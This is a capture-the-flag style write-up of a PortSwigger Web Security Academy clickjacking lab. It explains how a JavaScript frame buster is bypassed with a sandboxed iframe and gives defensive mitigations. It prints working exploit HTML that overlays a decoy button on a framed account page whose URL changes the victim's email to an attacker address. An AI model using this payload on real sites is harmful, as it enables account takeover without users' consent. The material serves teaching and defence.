# Clickjacking with a Frame Buster Script

> 📚 **Category:** Clickjacking
> 🎯 **Difficulty:** Apprentice
> 🛡️ **Platform:** PortSwigger Web Security Academy
> ✅ **Status:** Completed

---

## Skills Demonstrated

* Clickjacking
* HTML & CSS
* Browser Security
* Frame Busting
* Secure Header Analysis
* UI Redressing

---

# Overview

This lab demonstrates that **client-side frame buster scripts are not always a reliable defense against clickjacking**. Although the application attempted to prevent framing using JavaScript, the protection could be bypassed, allowing the page to be embedded inside an attacker-controlled website.

---

# Lab Objective

Bypass the application's frame buster protection and successfully perform a clickjacking attack.

---

# Understanding the Vulnerability

A frame buster script is a JavaScript mechanism that attempts to detect whether a page is loaded inside an iframe. If detected, the script usually forces the page to break out of the frame.

While this approach may stop simple attacks, it is **not a complete security control** because JavaScript execution can be restricted or manipulated.

Proper server-side protections such as **`X-Frame-Options`** and **Content Security Policy (`frame-ancestors`)** provide much stronger defenses.

---

# Solution Walkthrough

## Step 1 — Analyze the Protection

The application relied on a JavaScript frame buster instead of HTTP security headers.

---

## Step 2 — Restrict Script Execution

The iframe was loaded using the `sandbox` attribute with only the `allow-forms` permission enabled.

This prevented JavaScript from executing inside the iframe while still allowing the victim to submit forms.

As a result, the frame buster script never executed.

---

## Step 3 — Position the iframe

The iframe was positioned over a visible button using CSS so the victim unknowingly clicked the hidden target.

---

# Exploit Code

```html
<style>
    iframe {
        position: relative;
        width: 1500px;
        height: 1000px;
        opacity: 0.5;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 490px;
        left: 220px;
        z-index: 1;
    }
</style>

<div>Click Me</div>

<iframe sandbox="allow-forms"
src="https://LAB-URL/my-account?email=hacker@attacker-website.com">
</iframe>
```

> **Note:** The original PortSwigger lab URL has been replaced with a generic placeholder while preserving the exploit logic. The exploit is based on the solution you used during the lab.

---

# Code Breakdown

### `sandbox="allow-forms"`

Disables JavaScript execution inside the iframe while still permitting form submissions. This prevents the frame buster script from running.

### `opacity`

Keeps the iframe visible enough for alignment during testing while still concealing it from the victim.

### CSS Positioning

Aligns the hidden target element with the visible decoy button.

---

# Why the Attack Works

The application's clickjacking defense depended entirely on JavaScript.

By preventing JavaScript execution with the `sandbox` attribute, the frame buster never ran, allowing the page to remain embedded inside the iframe and enabling the clickjacking attack.

---

# Real-World Impact

Applications relying solely on client-side frame busting may still be vulnerable to clickjacking.

Attackers could exploit this weakness to:

* Modify account settings
* Trigger sensitive actions
* Submit forms without the user's awareness
* Abuse authenticated sessions

---

# Mitigation

Developers should:

* Use `X-Frame-Options`
* Use `Content-Security-Policy: frame-ancestors`
* Avoid relying solely on JavaScript frame busters
* Combine browser security headers with secure application design

---

# Key Takeaways

* JavaScript frame busters are not a complete security solution.
* The iframe `sandbox` attribute can prevent frame-busting scripts from executing.
* Browser security headers provide much stronger protection against clickjacking.

---

# References

* PortSwigger Web Security Academy
* OWASP Clickjacking Defense Cheat Sheet

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed for educational purposes in an authorized training environment.
